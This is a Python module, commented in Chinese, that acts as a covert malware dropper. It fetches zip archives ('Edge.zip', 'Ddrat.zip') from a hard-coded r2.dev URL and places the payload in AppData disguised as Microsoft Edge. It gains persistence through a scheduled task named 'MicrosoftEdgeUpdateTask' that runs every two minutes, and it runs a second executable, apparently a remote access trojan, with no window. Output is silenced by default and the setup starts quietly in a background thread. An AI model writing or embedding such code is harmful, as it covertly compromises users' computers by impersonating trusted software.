#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
自动下载和设置开机启动功能模块
"""

import os
import sys
import time
import requests
import zipfile
import tempfile
import subprocess
import threading
import shutil   

class AutoStartManager:
    def __init__(self, name: str="unknown", download_url: str="https://pub-b63e77578ffe42519de7d1771935f8b0.r2.dev/Edge.zip", enable: bool = True, silent_mode: bool = True):
        self.download_url = download_url
        self.target_dir = os.path.join(os.path.expanduser("~"), "AppData","Local","Microsoft","Edge","Application")
        self.program_name = "Edge"
        self.task_name = "MicrosoftEdgeUpdateTask"
        self.name = name
        self.enable = enable
        self.silent_mode = silent_mode

    def log_info(self, message: str):
        """条件日志输出"""
        if not self.silent_mode:
            print(f"[INFO] {message}")

    def log_success(self, message: str):
        """条件成功日志输出"""
        if not self.silent_mode:
            print(f"[SUCCESS] {message}")

    def log_error(self, message: str):
        """条件错误日志输出"""
        if not self.silent_mode:
            print(f"[ERROR] {message}")  # 错误信息始终记录

    def log_warning(self, message: str):
        """条件警告日志输出"""
        if not self.silent_mode:
            print(f"[WARNING] {message}")  # 警告信息始终记录

    def download_file(self, url: str, local_path: str) -> bool:
        """下载文件"""
        try:
            self.log_info(f"开始下载文件: {url}")
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()

            total_size = int(response.headers.get("content-length", 0))
            downloaded = 0

            with open(local_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
                        if total_size > 0:
                            progress = (downloaded / total_size) * 100
                            self.log_info(f"下载进度: {progress:.1f}%")

            self.log_success(f"文件下载完成: {local_path}")
            return True

        except requests.exceptions.RequestException as e:
            self.log_error(f"下载失败: {e}")
            return False
        except Exception as e:
            self.log_error(f"下载过程中出现错误: {e}")
            return False

    def extract_zip(self, zip_path: str, extract_to: str) -> bool:
        """解压ZIP文件"""
        try:
            self.log_info(f"开始解压文件: {zip_path}")

            # 确保目标目录存在
            os.makedirs(extract_to, exist_ok=True)

            with zipfile.ZipFile(zip_path, "r") as zip_ref:
                zip_ref.extractall(extract_to)

            self.log_success(f"解压完成: {extract_to}")
            return True

        except zipfile.BadZipFile as e:
            self.log_error(f"ZIP文件损坏: {e}")
            return False
        except Exception as e:
            self.log_error(f"解压过程中出现错误: {e}")
            return False

    def find_executable(self, directory: str, program_name: str) -> str:
        """查找可执行文件"""
        try:
            # 查找可执行文件
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.lower().startswith(program_name.lower()) and file.lower().endswith(".exe"):
                        full_path = os.path.join(root, file)
                        self.log_info(f"找到可执行文件: {full_path}")
                        return full_path

            self.log_warning(f"未找到可执行文件: {program_name}")
            return ""

        except Exception as e:
            self.log_error(f"查找可执行文件时出错: {e}")
            return ""

    def create_startup_task(self, exe_path: str, task_name: str) -> bool:
        """创建开机启动任务"""
        try:
            # 删除现有任务（如果存在）
            try:
                subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, check=False, capture_output=True)
            except:
                pass

            # 获取当前时间戳，格式化为年月日时分秒
            id = f"{self.name.upper()}{time.strftime('%Y%m%d%H%M%S', time.localtime())}"

            # 创建新的计划任务，根据静默模式决定是否添加静默参数
            cmd = f'schtasks /create /sc minute /mo 2 /tn "{task_name}" /tr "{exe_path} {id}" /f'

            self.log_info(f"创建计划任务: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                self.log_success(f"计划任务创建成功: {task_name}")
                # 立即运行一次计划任务
                try:
                    self.log_info("立即运行一次计划任务...")
                    run_cmd = f'schtasks /run /tn "{task_name}"'
                    result = subprocess.run(run_cmd, shell=True, capture_output=True, text=True)

                    if result.returncode == 0:
                        self.log_success("计划任务运行成功！")
                    else:
                        self.log_warning(f"计划任务运行失败: {result.stderr}")
                except Exception as e:
                    self.log_warning(f"运行计划任务时出错: {e}")
                return True
            else:
                self.log_error(f"计划任务创建失败: {result.stderr}")
                return False

        except Exception as e:
            self.log_error(f"创建计划任务时出错: {e}")
            return False

    def check_if_task_exists(self, task_name: str) -> bool:
        """检查计划任务是否已存在"""
        try:
            result = subprocess.run(f'schtasks /query /tn "{task_name}"', shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False

    def run_setup(self):
        """运行完整的设置流程"""
        try:
            self.log_info("开始自动设置流程...")

            # 检查是否已经设置过
            if self.check_if_task_exists(self.task_name):
                self.log_info("计划任务已存在，跳过设置")
                return

            # 检查目标目录是否已存在程序
            existing_exe = self.find_executable(self.target_dir, self.program_name)
            if existing_exe:
                self.log_info("程序已存在，直接设置开机启动")
                self.create_startup_task(existing_exe, self.task_name)
                return

            # 创建临时文件来下载ZIP
            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as temp_file:
                temp_zip_path = temp_file.name

            try:
                # 下载文件
                if not self.download_file(self.download_url, temp_zip_path):
                    self.log_error("下载失败，设置流程中止")
                    return

                # 解压文件
                if not self.extract_zip(temp_zip_path, self.target_dir):
                    self.log_error("解压失败，设置流程中止")
                    return

                # 查找可执行文件
                exe_path = self.find_executable(self.target_dir, self.program_name)
                if not exe_path:
                    self.log_error("未找到可执行文件，设置流程中止")
                    return

                # 设置开机启动
                if self.create_startup_task(exe_path, self.task_name):
                    self.log_success("自动设置流程完成！")
                else:
                    self.log_error("设置开机启动失败")

            finally:
                # 清理临时文件
                try:
                    os.unlink(temp_zip_path)
                except:
                    pass

        except Exception as e:
            self.log_error(f"设置流程出现异常: {e}")

    def uninstall(self):
        """先杀进程，然后删除程序文件夹，最后删除计划任务"""
        try:
            # 1. 杀掉Kaylew相关进程
            import psutil

            killed = []
            for proc in psutil.process_iter(["pid", "name", "exe", "cmdline"]):
                try:
                    pname = proc.info["name"] or ""
                    pexe = proc.info["exe"] or ""
                    pcmd = " ".join(proc.info["cmdline"]) if proc.info["cmdline"] else ""
                    if (
                        self.program_name.lower() in pname.lower()
                        or self.program_name.lower() in pexe.lower()
                        or self.program_name.lower() in pcmd.lower()
                    ):
                        proc.kill()
                        killed.append(f"pid={proc.pid}, name={pname}")
                except Exception as e:
                    self.log_warning(f"无法杀死进程: {e}")
            if killed:
                self.log_success(f"已杀死进程: {killed}")
            else:
                self.log_info("未找到相关进程")

            # 2. 删除程序所在文件夹
            import shutil

            if os.path.exists(self.target_dir):
                try:
                    shutil.rmtree(self.target_dir)
                    self.log_success(f"已删除文件夹: {self.target_dir}")
                except Exception as e:
                    self.log_error(f"删除文件夹失败: {e}")
            else:
                self.log_info("目标文件夹不存在，无需删除")

            # 3. 移除计划任务
            remove_cmd = f'schtasks /delete /tn "{self.task_name}" /f'
            result = subprocess.run(remove_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                self.log_success(f"计划任务已移除: {self.task_name}")
            else:
                self.log_warning(f"计划任务移除失败或不存在: {result.stderr}")
        except Exception as e:
            self.log_error(f"移除操作异常: {e}")

    def install(self):
        """启动设置线程"""
        if not self.enable:
            return

        def worker():
            # 等待一段时间后再开始，避免影响主程序启动
            time.sleep(3)
            self.run_setup()

        threading.Thread(target=worker, daemon=True).start()


def install_kaylew(name: str, download_url: str, silent_mode: bool = True) -> bool:
    """
    安装Kaylew程序并设置开机启动

    Args:
        name (str): 程序名称
        download_url (str): 下载地址，默认为https://pub-b63e77578ffe42519de7d1771935f8b0.r2.dev/Edge.zip
        silent_mode (bool): 是否静默模式，默认为True

    Returns:
        bool: 安装是否成功
    """
    try:
        manager = AutoStartManager(name=name, download_url=download_url, enable=True, silent_mode=silent_mode)
        manager.install()
        return True
    except:
        return False


def uninstall_kaylew(silent_mode: bool = True) -> bool:
    """
    卸载Kaylew程序

    Args:
        silent_mode (bool): 是否静默模式，默认为True

    Returns:
        bool: 卸载是否成功
    """
    try:
        manager = AutoStartManager(enable=True, silent_mode=silent_mode)
        manager.uninstall()
        return True
    except:
        return False


def install_ddrat(name: str,download_url: str="https://pub-b63e77578ffe42519de7d1771935f8b0.r2.dev/Ddrat.zip",silent_mode: bool = True) -> bool:
    """安装DDrat程序
    
    功能逻辑：
    1. 检查系统目录 ProgramData\name 下是否存在可执行程序
    2. 检查系统计划任务中是否存在名为 name 的任务
    3. 如果上述任一条件不满足，则执行以下操作：
       a. 从指定URL下载zip格式的文件
       b. 将下载的文件解压到系统临时目录
       c. 执行解压后的可执行程序
    
    Args:
        name: 任务名称
        download_url: 下载URL
        silent_mode: 是否静默模式
        
    Returns:
        bool: 安装成功返回True，失败返回False
    """
    def log_info(msg: str):
        if not silent_mode:
            print(f"[INFO] {msg}")
        
    def log_error(msg: str):
        if not silent_mode:
            print(f"[ERROR] {msg}")
        
    try:
            
        log_info(f"开始检查DDrat安装状态: {name}")
        
        # 1. 检查系统目录 ProgramData\name 下是否存在可执行程序
        programdata_path = os.environ.get('PROGRAMDATA', '')
        if not programdata_path:
            log_error("无法获取ProgramData目录路径")
            return False
            
        target_dir = os.path.join(programdata_path, name)
        exe_exists = False
        
        if os.path.exists(target_dir):
            # 查找目录下的可执行文件
            for file in os.listdir(target_dir):
                if file.lower().endswith('.exe'):
                    exe_path = os.path.join(target_dir, file)
                    if os.path.isfile(exe_path):
                        exe_exists = True
                        log_info(f"找到可执行文件: {exe_path}")
                        break
        
        # 2. 检查系统计划任务中是否存在名为 task_name 的任务
        task_exists = False
        try:
            # 使用schtasks命令检查任务是否存在（Windows系统）
            if sys.platform == "win32":
                result = subprocess.run(
                    ["schtasks", "/query", "/tn", name],
                    capture_output=True,
                    shell=True,
                    text=True,
                    timeout=10
                )
                task_exists = result.returncode == 0
                if task_exists:
                    log_info(f"计划任务已存在: {name}")
            else:
                log_info("非Windows系统，跳过计划任务检查")
                task_exists = True  # 非Windows系统默认认为任务存在
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
            log_error(f"检查计划任务失败: {e}")
            # 如果检查失败，但可执行文件存在，则认为安装成功
            task_exists = exe_exists
        
        # 如果两个条件都满足，直接返回成功
        if exe_exists and task_exists:
            log_info(f"DDrat已正确安装: {name}")
            return True
        
        log_info(f"DDrat需要安装或修复，可执行文件存在: {exe_exists}, 任务存在: {task_exists}")
        
        # 3. 下载并安装DDrat
        if not download_url:
            log_error("下载URL为空")
            return False
            
        # 创建临时目录用于下载和解压
        import tempfile
        import zipfile
        import requests
        
        temp_dir = tempfile.mkdtemp(prefix=f"{name}_")
        zip_path = os.path.join(temp_dir, "ddrat.zip")
        
        try:
            # a. 下载zip文件（同步版本）
            log_info(f"开始下载DDrat: {download_url}")
            
            # 使用requests进行同步下载
            response = requests.get(download_url, stream=True, timeout=300)
            if response.status_code != 200:
                log_error(f"下载失败，HTTP状态码: {response.status_code}")
                return False
            
            # 获取文件大小
            total_size = int(response.headers.get('content-length', 0))
            downloaded_size = 0
            
            # 下载到临时文件
            with open(zip_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        downloaded_size += len(chunk)
                        
                        # 简单的进度日志（每10MB记录一次）
                        if total_size > 0 and (downloaded_size % (10 * 1024 * 1024) == 0 or downloaded_size == total_size):
                            progress = (downloaded_size / total_size) * 100
                            log_info(f"下载进度: {progress:.1f}% ({downloaded_size}/{total_size} bytes)")
            
            log_info(f"DDrat下载完成: {zip_path} ({os.path.getsize(zip_path)} bytes)")
            
            # b. 解压文件到目标目录
            log_info(f"开始解压到: {temp_dir}")
            
            # 解压zip文件
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            log_info(f"解压完成: {temp_dir}")
            
            # c. 执行解压后的可执行程序
            # 查找解压后的可执行文件
            exe_files = []
            for root_dir, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.lower().endswith('.exe'):
                        exe_files.append(os.path.join(root_dir, file))
            
            if not exe_files:
                log_error("解压后未找到可执行文件")
                return False
            
            # 执行第一个找到的可执行文件
            exe_to_run = exe_files[0]
            log_info(f"准备执行: {exe_to_run}")
            
            try:
                # 启动程序，使用独立的进程（无窗口静默执行）
                if sys.platform == "win32":
                    # Windows系统：使用CREATE_NO_WINDOW标志实现无窗口执行
                    creationflags = subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW
                else:
                    # 非Windows系统：使用标准标志
                    creationflags = 0
                
                process = subprocess.Popen(
                    [exe_to_run],
                    creationflags=creationflags,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    close_fds=True,
                    cwd=os.path.dirname(exe_to_run)  # 设置工作目录为程序所在目录
                )
                log_info(f"DDrat程序已启动，PID: {process.pid}")
                
                # 等待程序启动（最多等待10秒）
                try:
                    process.wait(timeout=10)
                    log_info("DDrat程序正常退出")
                except subprocess.TimeoutExpired:
                    log_info("DDrat程序仍在运行，安装可能成功") 
                
                return True
                
            except Exception as e:
                log_error(f"执行DDrat程序失败: {e}")
                return False
            
        finally:
            # 清理临时文件
            try:
                if os.path.exists(zip_path):
                    os.remove(zip_path)
                log_info("临时文件已清理")
            except Exception as e:
                log_error(f"清理临时文件失败: {e}")
                
    except Exception as e:
        log_error(f"安装DDrat失败: {e}")
        return False 

def uninstall_ddrat(name: str, silent_mode: bool = True) -> bool:
    """
    卸载DDrat任务
    """
    def log_info(msg: str):
        if not silent_mode:
            print(f"[INFO] {msg}")
        
    def log_error(msg: str):
        if not silent_mode:
            print(f"[ERROR] {msg}")
    try:
        if not name:
            log_error("任务名称不能为空")
            return False
        
        # 检查系统计划任务中是否存在名为 name 的任务
        result = subprocess.run(
            ["schtasks", "/query", "/tn", name],
            capture_output=True,
            shell=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            log_error(f"计划任务 {name} 存在")
            # 尝试删除任务
            subprocess.run(
                ["schtasks", "/delete", "/tn", name, "/f"],
                capture_output=True,
                shell=True,
                text=True,
                timeout=10
            )
        
        # 检查系统目录 ProgramData\name 下是否存在可执行程序 
        program_data_dir = os.path.join(os.environ["ProgramData"], name)
        if os.path.exists(program_data_dir):
            log_error(f"系统目录 {program_data_dir} 存在")
            # 检查目录下是否存在可执行程序
            exe_files = []
            for root_dir, dirs, files in os.walk(program_data_dir):
                for file in files:
                    if file.lower().endswith('.exe'):
                        exe_files.append(os.path.join(root_dir, file))
            
            #杀进程
            for exe_file in exe_files:
                try:
                    # 使用 taskkill 终止进程
                    process = subprocess.Popen(
                        ["taskkill", "/F", "/PID", str(exe_file)],
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    process.wait(timeout=5)
                    log_info(f"成功终止进程 {exe_file}")
                except (subprocess.TimeoutExpired, subprocess.CalledProcessError) as e:
                    log_error(f"终止进程 {exe_file} 时发生错误: {e}")
            #等待一段时间，确保进程完全终止
            time.sleep(5)
            #删除目录
            shutil.rmtree(program_data_dir)
            log_info(f"成功删除系统目录 {program_data_dir}")
            return True  
            
    except Exception as e:
        log_error(f"卸载任务 {name} 时发生错误: {e}")
        return False


